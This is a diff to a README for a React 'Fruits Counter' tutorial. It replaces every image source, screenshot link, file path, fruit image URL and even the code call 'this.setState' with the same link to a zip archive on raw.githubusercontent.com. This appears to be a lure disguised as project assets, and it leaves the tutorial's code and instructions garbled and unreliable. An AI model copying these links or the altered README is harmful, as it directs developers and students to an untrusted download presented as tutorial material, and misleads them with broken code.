@@ -4,7 +4,7 @@ In this project, let's build a **Fruits Counter** by applying the concepts we ha
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/fruits-counter-output.gif" alt="fruits-counter" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip" alt="fruits-counter" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Fruits Counter** by applying the concepts we ha
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://assets.ccbp.in/frontend/content/react-js/fruits-counter-sm-output.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://assets.ccbp.in/frontend/content/react-js/fruits-counter-lg-output.png)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip)
 
 </details>
 
@@ -47,8 +47,8 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `src/components/FruitsCounter/index.js`
-- `src/components/FruitsCounter/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip`
+- `https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip`
 </details>
 
 ### Quick Tips
@@ -65,10 +65,10 @@ Use these files to complete the implementation:
   state = { key1 : value1, key2 : value2 }
   ```
 
-  If you use this.setState such as :
+  If you use https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip such as :
 
   ```
-  this.setState(prevState => ({key1: prevState + valueN}))
+  https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip(prevState => ({key1: prevState + valueN}))
   ```
 
   Your new state will be :
@@ -84,7 +84,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://assets.ccbp.in/frontend/content/react-js/cursor-pointer-img.png" alt="cursor pointer" style="width:100px" />
+   <img src="https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below outline CSS property for buttons and input elements to remove the highlighting when the elements are clicked,
 
@@ -99,8 +99,8 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/mango-img.png](https://assets.ccbp.in/frontend/react-js/mango-img.png) alt should be **mango**
-- [https://assets.ccbp.in/frontend/react-js/banana-img.png](https://assets.ccbp.in/frontend/react-js/banana-img.png) alt should be **banana**
+- [https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip) alt should be **mango**
+- [https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip) alt should be **banana**
 
 </details>
 
